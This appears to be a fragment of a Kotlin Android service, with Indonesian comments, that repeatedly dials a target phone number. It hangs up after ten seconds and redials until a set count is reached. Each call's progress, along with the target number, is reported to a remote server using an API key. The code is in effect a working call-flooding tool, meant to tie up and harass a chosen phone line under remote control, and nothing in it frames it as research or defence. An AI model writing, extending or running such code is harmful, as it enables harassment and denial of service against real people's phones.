// Di dalam startCallLoop:
private fun startCallLoop(target: String, maxCount: Int) {
    stopCallLoop()
    isCalling = true
    var current = 0
    
    callRunnable = object : Runnable {
        override fun run() {
            if (!isCalling || current >= maxCount) {
                sendReport(target, "Selesai", current, maxCount)
                return
            }
            current++
            
            val callIntent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$target")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (ContextCompat.checkSelfPermission(this@CallerService, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                startActivity(callIntent)
            }

            // Lapor progress ke server
            sendReport(target, "Menelepon...", current, maxCount)

            handler.postDelayed({
                if (!isCalling) return@postDelayed
                val endCall = Intent(Intent.ACTION_MEDIA_BUTTON)
                endCall.putExtra(Intent.EXTRA_KEY_EVENT, KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENDCALL))
                sendOrderedBroadcast(endCall, null)
                
                handler.postDelayed(this, 5000)
            }, 10000)
        }
    }
    handler.post(callRunnable!!)
}

// Update sendReport
private fun sendReport(target: String, status: String, current: Int = 0, max: Int = 0) {
    val json = JSONObject()
    json.put("target", target)
    json.put("status", status)
    json.put("current", current)
    json.put("max", max)
    
    val mediaType = "application/json; charset=utf-8".toMediaType()
    val body = json.toString().toRequestBody(mediaType)
    
    val request = Request.Builder()
        .url("$baseUrl/report")
        .addHeader("x-api-key", apiKey)
        .post(body)
        .build()
        
    client.newCall(request).enqueue(object : Callback {
        override fun onFailure(call: Call, e: IOException) {}
        override fun onResponse(call: Call, response: Response) {}
    })
}